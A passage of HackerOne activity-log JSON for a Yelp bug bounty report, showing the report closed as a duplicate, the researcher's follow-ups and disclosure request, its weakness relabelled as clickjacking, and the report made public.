Team\u003c/p\u003e\n","automated_response":true,"created_at":"2017-01-28T23:00:52.806Z","updated_at":"2017-01-28T23:00:52.806Z","actor":{"url":"/yelp","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Yelp"}},"genius_execution_id":null,"team_handle":"yelp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1452055,"is_internal":false,"editable":false,"type":"Activities::BugDuplicate","message":"Hi there!\n\nWe received a similar report for this issue. Thus, we are resolving this report as a duplicate.\n\nPlease keep banging away on the Yelps, we'd love to see what else you find.\n\nBest,\nThe Yelp Security Team","markdown_message":"\u003cp\u003eHi there!\u003c/p\u003e\n\n\u003cp\u003eWe received a similar report for this issue. Thus, we are resolving this report as a duplicate.\u003c/p\u003e\n\n\u003cp\u003ePlease keep banging away on the Yelps, we\u0026#39;d love to see what else you find.\u003c/p\u003e\n\n\u003cp\u003eBest,\u003cbr\u003e\nThe Yelp Security Team\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-30T17:57:18.404Z","updated_at":"2017-01-30T17:57:18.404Z","original_report_id":49888,"actor":{"username":"aaronloo","cleared":false,"url":"/aaronloo","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"yelp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1453912,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Okay thanks\n your profile doesnt say a word about duplicates but no problem may I get added to the other report to see it and may we public disclosure this","markdown_message":"\u003cp\u003eOkay thanks\u003cbr\u003e\n your profile doesnt say a word about duplicates but no problem may I get added to the other report to see it and may we public disclosure this\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-31T12:34:38.150Z","updated_at":"2017-01-31T12:34:38.150Z","first_to_agree":true,"actor":{"username":"mohamedsherif","cleared":false,"url":"/mohamedsherif","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/054/3183c7fd785c00f297f0d6f816bf009ced6a3a01_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"yelp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1519443,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello ,\n\nAny updates here\n\nThanks ,\nMohamed","markdown_message":"\u003cp\u003eHello ,\u003c/p\u003e\n\n\u003cp\u003eAny updates here\u003c/p\u003e\n\n\u003cp\u003eThanks ,\u003cbr\u003e\nMohamed\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-04T17:54:04.675Z","updated_at":"2017-03-04T17:54:04.675Z","actor":{"username":"mohamedsherif","cleared":false,"url":"/mohamedsherif","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/054/3183c7fd785c00f297f0d6f816bf009ced6a3a01_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"yelp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1522637,"is_internal":false,"editable":false,"type":"Activities::CommentsClosed","message":"We don't add third parties to privately reported issues. We may consider publicly disclosing the original report if the author submits a request.","markdown_message":"\u003cp\u003eWe don\u0026#39;t add third parties to privately reported issues. We may consider publicly disclosing the original report if the author submits a request.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-06T19:15:41.346Z","updated_at":"2017-03-06T19:15:41.346Z","actor":{"url":"/yelp","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Yelp"}},"genius_execution_id":null,"team_handle":"yelp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2147310,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-11-09T20:24:48.904Z","updated_at":"2018-02-28T13:11:27.772Z","additional_data":{"added_weaknesses":[{"id":74,"name":"UI Redressing (Clickjacking)"}],"removed_weaknesses":[{"id":75,"name":"Privilege Escalation"}]},"actor":{"username":"dchan","cleared":false,"url":"/dchan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"yelp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2147315,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-11-09T20:27:02.817Z","updated_at":"2017-11-09T20:27:02.817Z","actor":{"username":"dchan","cleared":false,"url":"/dchan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"yelp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2147316,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-11-09T20:27:02.975Z","updated_at":"2017-11-09T20:27:02.975Z","actor":{"username":"dchan","cleared":false,"url":"/dchan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"yelp","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}